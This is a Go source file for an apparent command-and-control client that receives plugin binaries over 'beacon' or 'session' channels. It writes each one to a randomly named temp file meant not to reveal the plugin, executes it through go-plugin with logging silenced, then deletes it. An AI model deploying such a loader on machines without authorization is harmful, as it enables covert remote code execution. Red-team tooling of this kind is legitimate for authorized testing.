package rpc_client

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"sync"

	"src/Client/dynamic/shared"
	"src/Client/generic/commands"
	"src/Client/generic/config"
	"src/Client/generic/logger"

	hclog "github.com/hashicorp/go-hclog"
	"github.com/hashicorp/go-plugin"
)

// In-memory store for dynamic commands and their clients/metadata
// We now lazy-start external plugin processes only when executing a command,
// then shut them down immediately after, while keeping their bytes/path cached
// in memory for fast subsequent starts. Built-ins stay in-process.
type DynamicCommand struct {
	// For built-in commands we keep the adapter client forever in-process.
	Client shared.Command

	// Cached bytes of the plugin binary, if provided via beacon/session.
	data []byte

	// Optional on-disk plugin path to execute when starting the plugin.
	pluginPath string

	// Protects start/stop of a plugin process for this command.
	mu sync.Mutex
}

var dynamicCommands = make(map[string]*DynamicCommand)
var dynamicCommandsMutex sync.RWMutex

// builtInCommands now holds instances of your new commands.BuiltInCommand interface
var builtInCommands = make(map[string]commands.BuiltInCommand)

// builtInAdapter wraps a commands.BuiltInCommand to satisfy shared.Command for in-memory use.
type builtInAdapter struct {
	impl commands.BuiltInCommand
}

func (b *builtInAdapter) Execute(args []string) (string, error) {
	return b.impl.Execute(args)
}

func (b *builtInAdapter) ExecuteFromSession(args []string) (string, error) {
	return b.impl.ExecuteFromSession(args)
}

func (b *builtInAdapter) ExecuteFromBeacon(args []string, data string) (string, error) {
	return b.impl.ExecuteFromBeacon(args, data)
}

func RegisterBuiltInCommand(name string, cmd commands.BuiltInCommand) {
	builtInCommands[name] = cmd
}

// LoadDynamicCommandFromBeacon caches plugin bytes so we can spin up the process only when executing.
func LoadDynamicCommandFromBeacon(cmdName string, data []byte) error {
	if len(data) == 0 {
		return fmt.Errorf("no plugin bytes provided for %s", cmdName)
	}
	dynamicCommandsMutex.Lock()
	defer dynamicCommandsMutex.Unlock()
	dc, ok := dynamicCommands[cmdName]
	if !ok || dc == nil {
		dc = &DynamicCommand{}
	}
	dc.data = append([]byte(nil), data...)
	// Ensure previous client is cleared for external plugins; built-ins unaffected.
	if _, isBuiltin := builtInCommands[cmdName]; !isBuiltin {
		dc.Client = nil
	}
	dynamicCommands[cmdName] = dc
	// Ensure the host knows how to decode this plugin type when it starts.
	shared.RegisterPlugin(cmdName, &shared.CommandPlugin{})
	logger.Log(fmt.Sprintf("Cached dynamic command bytes for '%s' (lazy start on execute)", cmdName))
	return nil
}

// LoadDynamicCommandFromSessionData writes plugin bytes to a temporary file and loads it
func LoadDynamicCommandFromSession(cmdName string, data []byte) error {
	return LoadDynamicCommandFromBeacon(cmdName, data)
}

func LoadDynamicCommand(cmdName string, pluginPath string) error {
	logger.Log(fmt.Sprintf("Registering dynamic command: %s (path: %s)", cmdName, pluginPath))
	if pluginPath == "" {
		if cmd, ok := builtInCommands[cmdName]; ok {
			dynamicCommandsMutex.Lock()
			dynamicCommands[cmdName] = &DynamicCommand{Client: &builtInAdapter{impl: cmd}}
			dynamicCommandsMutex.Unlock()
			logger.Log(fmt.Sprintf("Registered built-in command in memory: '%s'", cmdName))
			return nil
		}
		return fmt.Errorf("no plugin path specified and no built-in command '%s' found", cmdName)
	}

	// For external plugins, just cache the path; we'll lazy-start on first execute.
	dynamicCommandsMutex.Lock()
	dc, ok := dynamicCommands[cmdName]
	if !ok || dc == nil {
		dc = &DynamicCommand{}
	}
	dc.pluginPath = pluginPath
	// Ensure we don't hold onto any stale client for external plugins.
	if _, ok := builtInCommands[cmdName]; !ok {
		dc.Client = nil
	}
	dynamicCommands[cmdName] = dc
	dynamicCommandsMutex.Unlock()

	// Register the plugin type for go-plugin, but don't start a process now.
	shared.RegisterPlugin(cmdName, &shared.CommandPlugin{})
	logger.Log(fmt.Sprintf("Dynamic command '%s' cached (lazy start on execute)", cmdName))
	return nil
}

// startPluginProcess starts the plugin process for the given command if needed
// and sets dc.Client. Caller must hold dc.mu. Returns a cleanup func to stop it.
func startPluginProcess(cmdName string, dc *DynamicCommand) (func(), error) {
	// Built-in command: nothing to start.
	if dc.Client != nil {
		// If this is a built-in adapter, just return no-op cleanup.
		if _, ok := builtInCommands[cmdName]; ok {
			return func() {}, nil
		}
	}

	// Prepare an executable path. If data is cached, materialize to a temp file.
	pluginPath := dc.pluginPath
	var tmpToRemove string
	if len(dc.data) > 0 {
		// Create a randomized temp file name that doesn't leak the plugin name
		tmp, err := os.CreateTemp("", "pp-*.bin")
		if err != nil {
			return nil, fmt.Errorf("failed to create temp file for plugin %s: %w", cmdName, err)
		}
		if _, err := tmp.Write(dc.data); err != nil {
			tmp.Close()
			os.Remove(tmp.Name())
			return nil, fmt.Errorf("failed to write plugin data for %s: %w", cmdName, err)
		}
		tmp.Close()
		if err := os.Chmod(tmp.Name(), 0700); err != nil {
			os.Remove(tmp.Name())
			return nil, fmt.Errorf("failed to set execute permission for plugin %s: %w", cmdName, err)
		}
		pluginPath = tmp.Name()
		tmpToRemove = tmp.Name()
	}
	if pluginPath == "" {
		return nil, fmt.Errorf("no plugin data/path available for '%s'", cmdName)
	}

	// Configure the go-plugin logger: be noisy in debug, silent otherwise
	var plog hclog.Logger
	if config.IsDebug() {
		plog = hclog.New(&hclog.LoggerOptions{
			Name:  "plugin.host",
			Level: hclog.Debug,
		})
	} else {
		plog = hclog.New(&hclog.LoggerOptions{
			Name:   "plugin.host",
			Level:  hclog.Off,
			Output: io.Discard,
		})
	}

	// Note: go-plugin communicates over stdio pipes internally. Named pipes are
	// not directly supported by the framework. We keep the process short-lived
	// to prevent many concurrent subprocesses.
	client := plugin.NewClient(&plugin.ClientConfig{
		HandshakeConfig:  shared.HandshakeConfig,
		Plugins:          shared.PluginMap,
		Cmd:              exec.Command(pluginPath),
		AllowedProtocols: []plugin.Protocol{plugin.ProtocolNetRPC},
		Logger:           plog,
	})

	rpcClient, err := client.Client()
	if err != nil {
		client.Kill()
		if tmpToRemove != "" {
			os.Remove(tmpToRemove)
		}
		return nil, fmt.Errorf("failed to create RPC client for %s: %w", cmdName, err)
	}
	raw, err := rpcClient.Dispense(cmdName)
	if err != nil {
		client.Kill()
		if tmpToRemove != "" {
			os.Remove(tmpToRemove)
		}
		return nil, fmt.Errorf("failed to dispense plugin for %s: %w", cmdName, err)
	}
	cmd, ok := raw.(shared.Command)
	if !ok {
		client.Kill()
		if tmpToRemove != "" {
			os.Remove(tmpToRemove)
		}
		return nil, fmt.Errorf("plugin %s does not implement shared.Command interface", cmdName)
	}
	dc.Client = cmd

	cleanup := func() {
		// Close the plugin process after the call to avoid many idle subprocesses.
		client.Kill()
		// Clear transient client for next lazy start.
		dc.Client = nil
		if tmpToRemove != "" {
			os.Remove(tmpToRemove)
		}
	}
	return cleanup, nil
}

// ExecuteFromBeacon executes a loaded dynamic command in beacon context using the RPC client.
func ExecuteFromBeacon(cmdName string, args []string, data string) (string, error) {
	dynamicCommandsMutex.RLock()
	dc, ok := dynamicCommands[cmdName]
	dynamicCommandsMutex.RUnlock()
	if !ok {
		return "", fmt.Errorf("dynamic command '%s' not loaded", cmdName)
	}

	// Fast path for built-ins
	if _, isBuiltin := builtInCommands[cmdName]; isBuiltin {
		return dc.Client.ExecuteFromBeacon(args, data)
	}

	dc.mu.Lock()
	cleanup, err := startPluginProcess(cmdName, dc)
	if err != nil {
		dc.mu.Unlock()
		return "", err
	}
	// Ensure cleanup and unlock even if execution fails.
	defer func() {
		cleanup()
		dc.mu.Unlock()
	}()
	return dc.Client.ExecuteFromBeacon(args, data)
}

// ExecuteFromSession executes a loaded dynamic command in session context using the RPC client.
func ExecuteFromSession(cmdName string, args []string) (string, error) {
	dynamicCommandsMutex.RLock()
	dc, ok := dynamicCommands[cmdName]
	dynamicCommandsMutex.RUnlock()
	if !ok {
		return "", fmt.Errorf("dynamic command '%s' not loaded", cmdName)
	}

	// Fast path for built-ins
	if _, isBuiltin := builtInCommands[cmdName]; isBuiltin {
		return dc.Client.ExecuteFromSession(args)
	}

	dc.mu.Lock()
	cleanup, err := startPluginProcess(cmdName, dc)
	if err != nil {
		dc.mu.Unlock()
		return "", err
	}
	defer func() {
		cleanup()
		dc.mu.Unlock()
	}()
	return dc.Client.ExecuteFromSession(args)
}

// HasCommand checks if a dynamic command is loaded.
func HasCommand(cmdName string) bool {
	dynamicCommandsMutex.RLock()
	defer dynamicCommandsMutex.RUnlock()
	dc, ok := dynamicCommands[cmdName]
	return ok && dc != nil
}

// ListDynamicCommands returns the names of loaded dynamic commands.
func ListDynamicCommands() []string {
	dynamicCommandsMutex.RLock()
	defer dynamicCommandsMutex.RUnlock()
	list := make([]string, 0, len(dynamicCommands))
	for name := range dynamicCommands {
		list = append(list, name)
	}
	return list
}
